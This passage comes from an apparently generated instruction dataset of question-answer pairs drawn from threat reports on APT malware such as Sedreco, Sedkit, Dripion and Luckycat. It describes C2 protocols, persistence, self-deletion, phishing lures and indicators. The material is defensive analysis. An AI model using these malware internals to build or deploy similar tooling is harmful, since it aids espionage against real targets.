extracted starting from offset 14 (i.e 15th character) and it determines the length of the string to extract by finding the start offset of the string \"clientpermission\" once it finds it, its offset value is subtracted with 17. The command string to trigger the download functionality is extracted from the C2 response using the logic shown below. Below screen shot shows the logic used to extract the filename and the command string, in the below screen shot the extracted command string is stored in the variable ServerTask1Permission.\nOnce the filename and command string is extracted, the malware compares the command string with the string \"Pending\", if the command string matches with string \"Pending\" then the extracted filename (in this case the extracted filename is \"testfile\") from the C2 response is concatenated with \".exe\" as shown below.\nIt then connects to the hard coded IP 91[.]205[.]173[.]3 on port 6134, and it sends the concatenated filename (testfile.exe) as shown below.\nThe IP address after verifying the filename then returns the executable content which malware reads directly from the network stream and writes to the disk in the %Appdata%\\SQLIte directory as shown below.\nThe dropped file is then executed as shown in the below screen shot.\nSmall Headline: c) Update Functionality\nMalware has the capability to update itself this is done by making a request to updateproductdownload.php, if C2 response satisfies the condition then it downloads the updated executable from an URL. After understanding the logic & to satisfy the condition the environment was configured to give proper response. Below screen shot shows the response given to the malware when it makes a request to updateproductdownload.php\nMalware then reads the c2 response and from the C2 response it extracts two things a) URL to download the updated executable and b) the command string that will trigger the update functionality\nFrom the C2 response the URL is extracted by finding the start offset of the string \"updatetpermission\" once it finds it, its offset value is subtracted with 17 to get the URL from where the updated executable will be downloaded. To get the command string malware extracts the string starting from the offset of the string \"updatetpermission\" + 19 and extracts a 7 character length string which it uses as the command string.\nBelow screen shot shows the logic used to extract the URL and the command string, in the below screen shot the extracted command string is stored in the variable ServerUpdatePermissionInstruction.\nOnce the URL and command string is extracted, the malware compares the command string with the string \"Pending\", only if the command string matches with string \"Pending\" then the malware downloads the updated executable from the extracted URL. Below screen shot shows the code which performs the check and and extracted URL\nNote: In the below screen shot the URL (hxxp://c2xyup.com/update.exe) is not the actual URL used by the malware for updating, this is a test URL used to determine the functionality, so this URL should not used as an indicator.\nThe malware then downloads the updated executable and drops it in the %Appdata%\\SQLite directory as shown in the below screen shots.\nOnce it downloads the updated executable then the malware creates a value in the Run registry key for persistence, before that it deletes the old entry and adds the new entry so that next time when the system starts the updated executable will run. Below screen shots show the registry entry added by the malware.\nThe functionality allows the attacker to update their malware components.\nSmall Headline: d) Delete/Uninstall Functionality\nMalware also has the capability to delete itself this is done by making a request to Uninstaller.php. Below screen shot shows the code that makes this request.\nThe environment was configured to give a proper response to trigger the uninstall/delete functionality. Below screen shot shows the network traffic making the POST request to Uninstaller.php and the returned response.\nMalware then checks if the C2 response contains the string \"delete\". Below screen shots show the code that reads the C2 response and the code that performs the check.\nIf the C2 response contains the string \"delete\", then the malware first deletes the entry from the Run registry that the malware uses for persistence as shown below.\nAfter deleting the registry entry, malware deletes all the files from the %Appdata%\\SQLite directory by creating a batch script. The batch script pings a hard coded IP address 180[.]92[.]154[.]176 10 times (this is a technique used to sleep for 10 seconds) before deleting all the files.\nOnce the all the files are deleted the malware kills its own process as shown in the below screen shot.\nThis functionality allows the attackers to delete their footprints on the system.\nMedium Headline: C2 Information\nThis section contains the details of the C2 domain qhavcloud[.]com. This C2 domain was associated with two IP addresses. Both of these IP addresses is associated with hosting provider in Germany as shown in the screen shots below.\nThe hard coded IP address 91[.]205[.]173[.]3 in the binary from where the malware downloads additional components is also associated with the same hosting provider in Germany as shown below.\nThe C2 domain qhavcloud[.]com was also found to be associated with multiple malware samples in the past. Below screen shot shows the md5 hashes of the samples that is associated with the C2 domain.\nThe C2 domain qhavcloud[.]com and the hard coded IP address 91[.]205[.]173[.]3 were also found to be associated with another (<https://ciso.economictimes.indiatimes.com/news/cyber-security-team-discover-coordinated-attempt-of-hackers-targeting-senior-army-officers/58007868>)attack campaign which targeted the senior army officers. This suggests that the same espionage group involved in this attack also targeted the senior army officers using a different email theme.\nQuestion: How does the malware update itself, and what steps does it take to ensure the updated version runs at system startup?",
    "output": "Answer: The malware updates itself by making a request to updateproductdownload.php. If the C2 response satisfies certain conditions, it extracts a URL and a command string. The URL is determined by finding the start offset of the string 'updatetpermission' and subtracting 17. The command string is extracted starting from the offset of 'updatetpermission' + 19 and is 7 characters long. If the command string matches 'Pending', the malware downloads the updated executable from the extracted URL and saves it in the %Appdata%\\\\SQLite directory. It then creates a new value in the Run registry key for persistence, deleting the old entry and adding the new one, ensuring the updated executable runs at system startup.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nCrime and espionage form a dark underworld of cyberspace. Whereas crime is usually the first to seek out new opportunities and methods, espionage usually follows in its wake, borrowing techniques and tradecraft. The Shadows in the Cloud report illustrates the increasingly dangerous ecosystem of crime and espionage and its embeddedness in the fabric of global cyberspace.\nThis ecosystem is the product of numerous factors. Attackers employ complex, adaptive attack techniques that demonstrate high-level ingenuity and opportunism. They take advantage of the cracks and fissures that open up in the fast-paced transformations of our technological world. Every new software program, social networking site, cloud computing, or cheap hosting service that is launched into our everyday digital lives creates an opportunity for this ecosystem to morph, adapt, and exploit.\nIt has also emerged because of poor security practices of users, from individuals to large organizations. We take for granted that the information and communications revolution is a relatively new phenomenon, still very much in the midst of unceasing epochal change. Public institutions have adopted these new technologies faster than procedures and rules have been created to deal with the radical transparency and accompanying vulnerabilities they introduce.\nToday, data is transferred from laptops to USB sticks, over wireless networks at caf\u00e9 hot spots, and stored across cloud computing services whose servers are located in far-off political jurisdictions. These new modalities of communicating de-concentrate and disperse the targets of exploitation, multiplying the points of exposure and potential compromise. Paradoxically, documents and data are probably safer in a file cabinet, behind the bureaucrat's careful watch, than they are on the PC today.\nThe ecosystem of crime and espionage is also emerging because of opportunism on the part of actors. Cyber espionage is the great equalizer. Countries no longer have to spend billions of dollars to build globe-spanning satellites to pursue high-level intelligence gathering, when they can do so via the web. We have no evidence in this report of the involvement of the People's Republic of China (PRC) or any other government in the Shadow network. But an important question to be entertained is whether the PRC will take action to shut the Shadow network down. Doing so will help to address long-standing concerns that malware ecosystems are actively cultivated, or at the very least tolerated, by governments like the PRC who stand to benefit from their exploits though the black and grey markets for information and data.\nFinally, the ecosystem is emerging because of a propitious policy environment \u2014 or rather the absence of one \u2014 at a global level. Governments around the world are engaged in a rapid race to militarize cyber space, to develop tools and methods to fight and win wars in this domain. This arms race creates an opportunity structure ripe for crime and espionage to flourish. In the absence of norms, principles and rules of mutual restraint at a global level, a vacuum exists for subterranean exploits to fill.\nThere is a real risk of a perfect storm in cyberspace erupting out of this vacuum that threatens to subvert cyberspace itself, either through over-reaction, a spiraling arms race, the imposition of heavy-handed controls, or through gradual irrelevance as people disconnect out of fear of insecurity.\nThere is, therefore, an urgent need for a global convention on cyberspace that builds robust mechanisms of information sharing across borders and institutions, defines appropriate rules of the road for engagement in the cyber domain, puts the onus on states to not tolerate or encourage mischievous networks whose activities operate from within their jurisdictions, and protects and preserves this valuable global commons.\nUntil such a normative and policy shift occurs, the shadows in the cloud may grow into a dark, threatening storm.\nRon Deibert\nDirector, the Citizen Lab, Munk School of Global Affairs\nUniversity of Toronto\nRafal Rohozinski\nCEO, The SecDev Group (Ottawa)\nBig Headline: Acknowledgments\nThis investigation is a result of a collaboration between the Information Warfare Monitor and the Shadowserver Foundation. Our ability to share critical information and analytical insights within a dedicated group of professionals allowed us to uncover and investigate the operation of the network documented in this report. The Information Warfare Monitor (infowar-monitor.net) is a joint activity of the Citizen Lab, Munk School of Global Affairs, University of Toronto, and the SecDev Group, an operational consultancy based in Ottawa specialising in evidence-based research in countries and regions under threat of insecurity and violence. The Shadowserver Foundation (shadowserver.org) was established in 2004 and is comprised of volunteer security professionals that investigate and monitor malware, botnets, and malicious attacks. Both the Information Warfare Monitor and the Shadowserver Foundation aim to understand and accurately report on emerging cyber threats as they develop.\nSteven Adair is a security researcher with the Shadowserver Foundation. He frequently analyzes malware, tracks botnets, and deals with cyber attacks of all kinds with a special emphasis on those linked to cyber espionage.\nRon Deibert is Director of the Citizen Lab at the Munk School of Global Affairs, University of Toronto. He is a co-founder and principal investigator of the OpenNet Initiative and Information Warfare Monitor. He is Vice President, Policy and Outreach, Psiphon Inc., and a principal with the SecDev Group.\nRafal Rohozinski is CEO of the SecDev Group and Psiphon Inc. He is a co-founder and principal investigator of the OpenNet Initiative and Information Warfare Monitor, and a senior research advisor at the Citizen Lab, Munk School of Global Affairs, University of Toronto.\nNart Villeneuve is the Chief Security Officer at the SecDev Group, Director of Operations of Psiphon Inc. and a senior SecDev research fellow at the Citizen Lab at the Munk School of Global Affairs, University of Toronto where he focuses on electronic surveillance, targeted malware and politically motivated digital attacks.\nGreg Walton conducted and coordinated the primary field-based research for the Shadow investigation in His Holiness the Dalai Lama's Office and the Tibetan Government-in-Exile in Dharamsala, India. Greg is a SecDev Group associate and editor of the Information Warfare Monitor website. He is the SecDev Fellow at the Citizen Lab at the Munk School of Global Affairs, University of Toronto.\nThis report represents a collective activity and numerous others also contributed to the research effort. This includes individuals in India, who for security reasons we cannot name. We are also grateful to the Office of His Holiness the Dalai Lama. The research of the Citizen Lab and the Information Warfare Monitor is supported by a generous grant from the John D. and Catherine T. MacArthur Foundation, in-kind and staff contributions from the SecDev Group, and a generous donation of software from Palantir Technologies Inc. We are very grateful to Masashi Crete-Nishihata (Citizen Lab) and Arnav Manchanda (SecDev Group) for research assistance, and to Jane Gowan (Agent 5 Design and Citizen Lab) for layout and design.\n\nQ: What urgent need does the 'Shadows in the Cloud' report identify to address the growing threats in cyberspace, and what specific measures are proposed to mitigate these risks?",
    "output": "A: The 'Shadows in the Cloud' report identifies an urgent need for a global convention on cyberspace to address the growing threats posed by crime and espionage. Specific measures proposed include building robust mechanisms for information sharing across borders and institutions, defining appropriate rules of engagement in the cyber domain, placing the onus on states to not tolerate or encourage malicious networks operating within their jurisdictions, and protecting and preserving the global commons of cyberspace. Without such a normative and policy shift, the report warns that the shadows in the cloud may evolve into a dark, threatening storm.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Identikit\nSedreco serves as a spying backdoor, whose functionalities can be extended with dynamically loaded plugins. It is made up of two distinct components: a dropper and the persistent payload installed by this dropper.\nAlternative Names\nAZZY\nUsage\nSedreco is deployed on targets deemed interesting after a reconnaissance phase. It serves for long-term espionage, thanks to the numerous commands provided by its payload.\nKnown period of activity\nMay 2012 to July 2016. Probably still in use at the time of writing (August 2016).\nKnown deployment methods\n\u2022 Downloaded by Seduploader\n\u2022 Downloaded by Downdelph\nDistinguishing characteristics\n\u2022 The Sedreco payload relies on a configuration usually stored in a registry key named Path, or in a file named msd, and initially embedded in the Sedreco dropper\n\u2022 The Sedreco payload creates a mutex named MutYzAz or AZZYMTX\n\u2022 The inbound and outbound communications of Sedreco's payload with its C&C server are buffered into two files, respectively named __2315tmp.dat and __4964tmp.dat\nMedium Headline: Dropper Workflow\nThe workflow of Sedreco's dropper is composed of the five steps presented in Figure 12.\nWhile straightforward, this workflow possesses some features worth mentioning:\n\u2022 The payload configuration is installed on the system by the dropper, in a file or in a registry key, depending on the sample. It means that analyzing a Sedreco payload sample itself will not reveal configuration information, such as the C&C server address (configuration content will be described below).\n\u2022 Payload persistence is usually ensured by registering an auto-start entry in the Windows Registry, but we have observed other methods, like registering the payload as a Shell Icon Overlay handler COM object (<>)[18].\n\u2022 During its execution the dropper builds a small report, which is then sent to the C&C server. Here is an example of such a report:\nEach line corresponds to one step of the dropper workflow, as described in Figure 12. The value 0 means success, while there would be an error code returned from the Windows API GetLastError otherwise.\nSmall Headline: Configuration\nThe first action of Sedreco's payload is to retrieve the configuration file previously installed by the dropper. This configuration file consists of a series of variably-sized data fields, preceded by a header, as described in Figure 13.\nThe configuration is encrypted with a custom algorithm using a 6-byte key stored at its beginning. An implementation of this algorithm in Python can be found in ESET's GitHub repository (<>)[10].\nFollowing the key come 10 1-byte fields, each of them containing the size of a corresponding data field. Those data fields contain the following values (ESET's names):\n1. Timer1: Time to wait between two attempts to ask the C&C server for a command to execute (usually set to 10 minutes)\n2. Timer2: Time to wait between two attempts to exfiltrate data to the C&C server (usually set to 10 minutes)\n3. Computer Name: Computer name to which a pseudo-randomly generated 6-byte value is appended, plus a two-byte value hardcoded in the dropper\n4. C&C1: Domain name of the first C&C server\n5. C&C2: Domain name of the second C&C server\n6. Operation Name: 4-character string initially hardcoded in the dropper, which likely identifies the operation or the target. So far, we have observed the following values: rhze, rhdn, rhst, rhbp, mtfs, mctf, mtqs. We do not know the exact meaning of these values.\n7. Keylogger MaxBuffer: Maximum size of the memory buffer where keystrokes are logged, before they are dumped to the outbound file (described below)\n8. Keylogger MaxTimeout: Maximum time to wait before the logged keystrokes are dumped to the outbound file (described below)\n9. Keylogger Flag: Specify whether to enable the keylogger or not\n10. C&C3: Domain name of the third C&C server\nThe next ten data fields are the paths to the plugins that Sedreco will load at startup. These fields are initially empty, and are updated when Sedreco receives a plugin to load from the C&C server.\nSmall Headline: Commands\nOnce it is running, Sedreco provides numerous commands to its operators, identified by a number, as described in Table 4. Those commands allow the attackers to spy on the target, but also to collect information on other computers accessible from the compromised machine.\nInterestingly, the commands are registered at runtime by calling an internal function \u2014 usually exported under the name RegisterNewCommand\u2014 with the command number and the address of the command handler. For example, Figure 14 shows the registration of the first six commands.\nThis mechanism makes Sedreco a flexible backdoor, which includes only the commands in a sample that are currently needed (which means in particular that the previous list of commands may not be complete). It also allows plugins to easily register new commands, as we will explain later.\nSmall Headline: Communications with the C&C server\nSedreco communicates with its C&C server in a quite unusual way, pictured in Figure 15.\nOn one hand, Sedreco network threads periodically ask the C&C server for orders, and store them in an\"inbound file\". Those orders are then fetched and processed by Sedreco core threads. On the other hand, the data to exfiltrate (logged keystrokes, results of executed commands, etc) are queued in an \"outbound file\", and periodically transmitted in bulk to the server by the network threads.\nAs this asynchronous communication method limits the number of network contacts with the C&C server, it might reduce the chance of attracting attention in the target's network. Moreover, using files rather than keeping the data buffered in memory avoids losing the data if the machine shuts down or loses network connectivity.\nIn the following sections, we describe the network communications and the exact format of the inbound/outbound files.\nVery Small Headline: Inbound Communications\nSedreco regularly asks its C&C server for a command to run \u2014usually every 10 minutes. The C&C server domain names are retrieved from the configuration, and they are contacted in their order of appearance in this configuration (see ). In other words, if the first C&C server is up \u2014 C&C1 in \u2014 the others are never contacted.\nThe actual contact is a POST request over HTTP or, depending of the sample, HTTPS, on the URI /update. The body of the request contains the base64-encoding of the data structure pictured in Figure 16.\nThis data structure is encrypted with the 6-byte key stored at the end, using the same algorithm as that used to encrypt the configuration file. The Type field is set to 0, which distinguishes inbound from outbound.\nThe C&C server will then answer with the information about a command to run, the commands being stored in the inbound file by Sedreco network threads. The inbound file is usually named __2315tmp.dat and located in the %TEMP% directory. This file consists of a series of variably-sized entries, each entry containing the information from the C&C server for one command to run, as described in Figure 17.\nAs before, each entry starts with a 6-byte key to decrypt the entry data, again using the same algorithm used for the configuration. Then comes a 4-byte magic value, which, in all the samples we analyzed, has to be set to 0x75DF9115 for the command to be executed. The entry may also contain the arguments to pass to the command handler.\nFinally, Sedreco core threads process the inbound file to extract and run the commands.\nVery Small Headline: Outbound Communications\nSedreco core threads store the output generated by a command execution in the outbound file, which is usually named __4964tmp.dat and located in the %TEMP% directory. Similarly to the inbound file, it consists of a series of variably-sized entries, each entry describing one particular command execution, as shown in Figure 18.\nEach entry begins with a 32-byte header, containing in particular a 4-byte magic number (0xB2745DAF), the command return status code, a timestamp of the command execution (in a SYSTEMTIME Windows structure (<>)[19]), and the actual command number. Then comes the output data generated by the command execution, compressed with a custom implementation of the Lempel\u2013Ziv\u2013Welch (LZW) algorithm (<>)[20].\nA source code search engine allowed us to retrieve what we believe to be the C source code of the LZW algorithm implementation employed by Sedreco (<>)[21]. Figure 19 shows an extract of the compressed data header\n((Dword *)buff)[0] = 0x21575A4C; ((Dword *)buff)[1] = bSize;\n/* 'LZW!' signature */\n((Dword *)buff)[2] = GetCRC32(data, bSize); lastByte += 12;\nLZWENTRY lzwTable[0x1000]; int tableSize = 0, beginTable = 0x100; for (int k = 0; k <= 0xFF; k++) { lzwTable[k].next = lzwTable[k].substrIndex = 0; lzwTable[k].substrSize = 1; }\nDword currentPos = 0; while (currentPos < bSize) {\n/* \u041f\u043e\u0438\u0441\u043a \u0441\u0430\u043c\u043e\u0439 \u0434\u043b\u0438\u043d\u043d\u043e\u0439 \u043f\u043e\u0434\u0441\u0442\u0440\u043e\u043a\u0438 */\nFigure 19. Extract of LZW algorithm C source code\nSedreco network threads regularly \u2014 usually every 10 minutes \u2014 fetch the data from the outbound file and encrypt them with the 3DES algorithm and a hardcoded key. The data structure described in is then appended to the encrypted data, thus acting as a footer. In this case, the Type field is set to 1.\nFinally, the resulting encrypted data are transmitted to the C&C server by Sedreco network threads.\n\nAnswer this question based on the above context: Explain the asynchronous communication method used by Sedreco to interact with its C&C server. How does this method help in reducing the risk of detection?",
    "output": "Sedreco uses an asynchronous communication method to interact with its C&C server. Network threads periodically ask the C&C server for orders and store them in an 'inbound file,' which are then processed by core threads. Data to exfiltrate, such as logged keystrokes and command results, are queued in an 'outbound file' and transmitted in bulk to the server. This method reduces the number of network contacts with the C&C server, thereby lowering the risk of attracting attention in the target's network. Additionally, using files instead of keeping data buffered in memory prevents data loss if the machine shuts down or loses network connectivity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ATTACk METhodS\nIn this section, we will describe the two main attack methods used by the Sednit group to deploy its malicious software. We already discussed the third attack method\u2014 fake webmail login panels \u2014in the .\nThe first method is to lure the target into opening an email attachment, while the second one relies on the target visiting a website containing a custom exploit kit. In both cases, the lure itself is usually a phishing email.\nMedium Headline: Email Attachments\nAs with many other cyber espionage actors, sending targeted phishing emails with malicious attachments is one of the main attack vectors of the Sednit group. Sometimes those attachments are simply executables, and no exploits are used. It is, for example, the case for the most recent deployment of Downdelph, a pretty surprising operation that we will describe in the third part of this whitepaper.\nOn the other hand, the Sednit group also uses exploits, and in some cases even 0-day exploits, with its email attachments. The list of vulnerabilities exploited with this attack method is described in Table 1, to the best of our knowledge.\nThe malware usually dropped by those exploits for the last two years has been , as shown in .\nTo illustrate this (well known) attack method, we are now going to briefly describe one particular recent phishing campaign with email attachments from the Sednit group. The email in question was sent to targets located in Ukraine in May 2016, and is pictured in Figure 8.\nThe subject of the email can be translated to\"The aggravation of Russian-EU relations\", while the body roughly translates to:\nGood afternoon!\nAttached you can find the document on Russia and the European Union aggravation of relations.\nYours faithfully,\nVasyl Stasiuk.\nUkrainian Academic Union,\n02140, Ukraine, Kiev, Prospect Bazhana Mykoly, 26, office 334\nThe address of the\"Ukrainian Academic Union\" is the correct one (<>)[28], while the sender email address was created by the attackers using a freemail provider.\nThe RTF attachment exploits the CVE-2015-1641 vulnerability (<>)[24] to drop two DLLs on the system, as described by Prevenity (<>)[25]. The first DLL loads each time a Microsoft Office application is executed, by registering it under a Windows Registry key named Office Test (see for details). This DLL in turn loads the second one, which is .\nInterestingly, the decoy document was apparently wrongly embedded when building the exploit, and thus fails to open. From the attachment name, we can speculate that it was supposed to be an RTF version of a news article entitled\"Putin Is Being Pushed to Abandon His Conciliatory Approach to the West and Prepare for War\" (<>)[29].\nThis particular case is one among a series of attacks using the CVE-2015-1641 vulnerability launched from April 2016 by the Sednit group (<>)[30] (more details in the ).\nMedium Headline: Sedkit: Exploit Kit for Targeted Attacks\nThe second main attack method of the Sednit group is an exploit kit, which we named Sedkit. It was discovered by ESET researchers in September 2014 (<>)[23]. At this time, several websites belonging to a large financial institution in Poland were modified to automatically redirect the visitors to the exploit kit\u2014also known as a watering hole attack (<>)[31].\nThe workflow of the Sedkit exploit kit has stayed the same since its first appearance. It is shown in Figure 9, and described below.\nSmall Headline: Attracting Visitors\nAs previously explained, the targets were initially attracted to visit Sedkit via a watering hole attacks. But since then, the usual way to lure the targets has been to send targeted phishing emails containing a URL pointing to Sedkit. Figure 10 shows an example of such a targeted phishing email from March 2016.\nThis email supposedly comes from Stratfor(<>)[32], an intelligence company providing regular reports on geopolitics. While the email signature and sender address are correct, the domain name in the URL is not\u2014 stratfor.com being the legitimate Stratfor domain name. Also, the URI path closely resembles the path of an existing article on the Stratfor website (/weekly/ruthless-and-sober-syria), the only difference being the insertion of an ID number (51586), which likely identifies the target.\nThe attentive reader may have noticed that the email body text contains a typing mistake:\"Sratfor\" rather than\"Stratfor\", indicating that this text was not copied but manually written by the attackers. Such typing mistakes are common in Sednit phishing emails.\nUsing legitimate news articles as lures, with URLs mimicking the real ones, is the usual way of attracting visitors to Sedkit since 2015. Table 2 shows some recent examples of news articles mimicked by Sedkit URLs.\nThese news articles not only serve as phishing clickbait, but also as a way to hide the exploitation attempt. Indeed, the visitor will be redirected to the real news article after having been exploited. Visitors not selected for exploitation, as explained below, will also be redirected. Thus, the target will be left under the impression that the phishing email was actually legitimate.\nIn order to be effective, the lure needs to be related to the target's interests. While in most cases we analyzed the lure was a news article about geopolitics, we also found a few cases using websites of legitimate Russian companies as lures.\n\nHow did the Sednit group leverage phishing emails to deploy Sedkit, and what techniques did they use to make the emails appear legitimate?",
    "output": "A: The Sednit group leveraged phishing emails to deploy Sedkit by sending targeted emails containing URLs that pointed to the exploit kit. To make these emails appear legitimate, the group often mimicked legitimate news articles or websites. For example, in March 2016, an email supposedly from Stratfor, an intelligence company, contained a URL that closely resembled a legitimate Stratfor article but included an ID number to identify the target. The email signature and sender address were correct, but the domain name in the URL was not the legitimate Stratfor domain. Additionally, the email body text contained a typing mistake ('Sratfor' instead of 'Stratfor'), indicating that it was manually written by the attackers. This technique of using legitimate-looking content helps to deceive the target into clicking the malicious link, thereby initiating the Sedkit exploit process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of key files in PIVY samples by the Molerats group enhance the attribution of related attacks, and what implications does this have for cybersecurity professionals?",
    "output": "The use of key files in PIVY samples by the Molerats group enhances the attribution of related attacks because it provides a unique identifier that can be tracked across multiple incidents. Unlike the default password 'admin', custom key files contain specific strings that are less likely to be coincidentally reused by unrelated actors. For example, the sample with MD5 hash 9dff139bbbe476770294fb86f4e156ac used a key file containing the ascii string 'Password (256 bits):\\\\x0d\\\\x0aA9612889F6'. This unique key file can be used to link different attacks to the same threat actor. The implication for cybersecurity professionals is that they can leverage these key files to track and attribute attacks more effectively, improving their ability to defend against and respond to threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why did the Dust Storm backdoor perform tests such as adding and removing a user and creating and deleting a folder before attempting to access the Windows Service Control Manager?",
    "output": "The Dust Storm backdoor performed these tests to ensure it had the necessary permissions and capabilities to execute more advanced operations on the system. By adding and removing a user and creating and deleting a folder, the backdoor could verify that it had administrative privileges and could manipulate the file system. These tests served as a preliminary check before proceeding with more sensitive actions, such as accessing the Windows Service Control Manager.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nThe number of targeted attacks has dramatically increased. Unlike largely indiscriminate attacks that focus on stealing credit card and banking information associated with cybercrime, targeted attacks noticeably differ and are better characterized as \"cyber espionage.\" Highly targeted attacks are computer intrusions threat actors stage in order to aggressively pursue and compromise specific targets, often leveraging social engineering, in order to maintain persistent presence within the victim's network so they can move laterally and extract sensitive information.1\nIn a typical targeted attack, a target receives a contextually relevant email that encourages a potential victim to click a link or open a file.2 The links and files the attackers send contain malicious code that exploits vulnerabilities in popular software. The exploits' payload is a malware that is silently executed on the target's computer. This exploitation allows the attackers to take control of and obtain data from the compromised computer. In other cases, the attackers send disguised executable files, usually compressed in archives that, if opened, also compromise the target's computer. The malware connects back to command-and-control (C&C) servers under the attackers' control from which they can command the compromised computer to download additional malware and tools that allow them to move laterally throughout the target's network. These attacks are, however, not isolated \"smash-and-grab\" incidents but are part of consistent campaigns that aim to establish covert presence in a target's network so that information can be extracted as needed.\nTargeted attacks are rarely isolated events. In fact, they are constant. It is more useful to think of them as campaigns\u2014a series of failed and successful attempts to compromise a target's network over a certain period of time. The attackers, in fact, often keep track of the different attacks within a campaign in order to determine which individual attack compromised a specific victim's network. As the attackers learn more about their targets from open source research\u2014relying on publicly available information, as well as previous attacks, the specificity of the attacks may sharply increase.\nCyber-espionage campaigns often focus on specific industries or communities of interest in addition to a geographic focus. Different positions of visibility often yield additional sets of targets pursued by the same threat actors. We have been tracking the campaign dubbed \"Luckycat\" and found that in addition to targeting Indian military research institutions, as previously revealed by Symantec, the same campaign targeted entities in Japan as well as the Tibetan community.3\nThe Luckycat campaign targeted the following industries and/or communities:\n\u2022 Aerospace\n\u2022 Energy\n\u2022 Engineering\n\u2022 Shipping\n\u2022 Military research\n\u2022 Tibetan activists\nThe Luckycat campaign attacked a diverse set of targets using a variety of malware, some of which have been linked to other cyber-espionage campaigns. The attackers behind this campaign maintain a diverse set of C&C infrastructure and leverages anonymity tools to obfuscate their operations. We were able to track elements of this campaign to hackers based in China.\nQ: What are the key characteristics of targeted attacks as described in the Luckycat campaign, and how do these characteristics contribute to the success of the campaign?",
    "output": "Key characteristics of targeted attacks in the Luckycat campaign include the use of contextually relevant emails to lure victims into clicking malicious links or opening infected files, the exploitation of software vulnerabilities to execute malware, and the establishment of a persistent presence within the victim's network. These characteristics contribute to the success of the campaign by allowing attackers to gain control of compromised computers and extract sensitive information over time. Additionally, the campaign is not a single event but a series of attempts to compromise a target's network, with attackers learning from previous attempts and open source research to increase the specificity and effectiveness of their attacks. The campaign also targets specific industries and communities, such as aerospace, energy, engineering, shipping, military research, and Tibetan activists, indicating a strategic focus on particular sectors and regions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Taiwan targeted with new cyberespionage back door Trojan\nMarch 28, 2016\nSymantec Official Blog\nBackdoor.Dripion was custom developed, deployed in a highly targeted fashion, and used command and control servers disguised as antivirus company websites.\nBy: Symantec Employee\nCreated 29 Mar 2016\n:\nView the .\nIn late August 2015, Symantec identified a previously unknown back door Trojan () infecting organizations primarily located in Taiwan, as well as Brazil and the United States. Dripion is custom-built, designed to steal information, and has been used sparingly in a limited number of targeted attacks. The attackers behind this campaign went to some lengths to disguise their activities, including using domains names disguised as antivirus (AV) company websites for their command and control (C&C) servers. These attacks have some links to earlier attacks by a group called Budminer involving the Taidoor Trojan ().\nThe threat posed by custom malware such as Dripion illustrates the value of multilayered security. Unknown threats may evade signature-based detection, but can be blocked by other detection tools which identify malicious behavior.\nBig Headline: Malware downloader\nOne of the first steps taken when investigating malware is to determine how it is getting onto a victim's computer. Many publicly available downloaders exist; however, only a few unique downloaders have been used over the past few years that have been exclusive to cyberespionage activity. Since Dripion appeared to be used by a single attacker against a small target group, we wanted to determine if the downloader could provide additional evidence to help attribute the threat to any known threat groups.\nThe downloader was identified as (MD5: 260f19ef39d56373bb5590346d2c1811). It is not a new piece of malware, having been in existence since at least 2011. How the victim was infected with Blugger is currently unknown.\nBlugger used encryption to make its infrastructure and commands queried in the URL requests harder to detect. After decrypting however, we identified the following URL requests:\nhttp://classic-blog.[REDACTED DOMAIN 1].com/nasyzk/20002630\nhttp://nasyzk.[REDACTED DOMAIN 2].net/blog/post/251315428\nBoth of the domains we analyzed in the URLs requested by the downloader are publicly accessible blogs. The downloader contacts these blog URLs in order to retrieve Dripion for installation.\nThe blog posts are primarily in English yet most of the targets are based in Taiwan. As illustrated in Figure 1, one of the blogs references US healthcare spending. It is unknown if the attacker created the blog or simply compromised another to use in their attacks. If the blog was compromised, then the attacker likely would not create posts themselves as it would show the blog's creator that something was awry. If the blog was created by the attacker, it may be an attempt to develop a blog with topics that would likely be of interest to the intended target. Most of the blogs were related to news events.\nBig Headline: The Dripion back door Trojan\nOnce Dripion is installed, the attacker can access the user's computer. Dripion has the functionally of a back door Trojan, letting attackers upload, download, and steal predetermined information from the victim, and execute remote commands. Information such as the victim's computer name and IP address are automatically transmitted to the C&C server upon the initial infection.\nAdditionally, the developer of the Dripion malware used XOR encoding for both the binary configuration file (XOR: 0xA8) as well as network requests with the C&C server (XOR: 0xA3), to make detection more difficult.\nDripion has been identified in multiple variations and has version numbers hardcoded within the malware. This indicates that the attackers have the ability to both create and develop their own custom malware as well as update their code to provide new capabilities and make detection more difficult.\nBig Headline: Ties to previous cyberespionage activity\nThe use of publicly accessible blogs to distribute malware is a tactic we have seen previously, but few cyberespionage groups have used this technique. Fewer still have used this strategy to deliver custom-developed malware not often seen in the wild.\nThe first piece of evidence pointing towards a link with previous cyberespionage campaigns was the use of the Blugger downloader, which has only been used by a group Symantec calls Budminer. This group has used Blugger to distribute its own custom malware known as (<http://www.symantec.com/connect/blogs/trojantaidoor-takes-aim-policy-think-tanks>)Taidoor (). Symantec has . Significantly, this is the first time we have seen Blugger used to deliver malware other than Taidoor.\nFurther investigation uncovered a second tie with earlier Budminer activity. One of the Blugger samples associated with Dripion connected with a root domain also used in Taidoor-related activity.\nBoth of the URL queries originated from the Blugger downloader which connected to the blog classic-blog.[REDACTED DOMAIN 1].com. They then call out to subdomains of the domain [REDACTED DOMAIN 3].net. Both Dripion and Taidoor not only connected to the same\nwebsite (classic-blog.[REDACTED DOMAIN 1].com) but also used the same URL (classic-blog.[REDACTED DOMAIN 1].com /nasyzk/[ENCODED TEXT]) to obtain the encrypted C&C configuration.\nBig Headline: Targeting\nSymantec first identified activity involving Dripion in September 2015. Based on the timestamp of the earliest known sample however, Dripion may have been in existence since 2013. The Dripion activity that we have analyzed is extremely targeted and has involved far fewer victims compared to the number of users infected with Taidoor.\nThe similarity between the two sets of activity is the number of unique file hashes found infecting users located in Taiwan.\nUnfortunately, we need more data to determine if the timestamps associated with Dripion dating back to November 2013 (7ad3b2b6eee18af6816b6f4f7f7f71a6) are legitimate or if they have been forged. The earliest known Dripion activity we were able to validate took place in November 2014. Despite the one-year 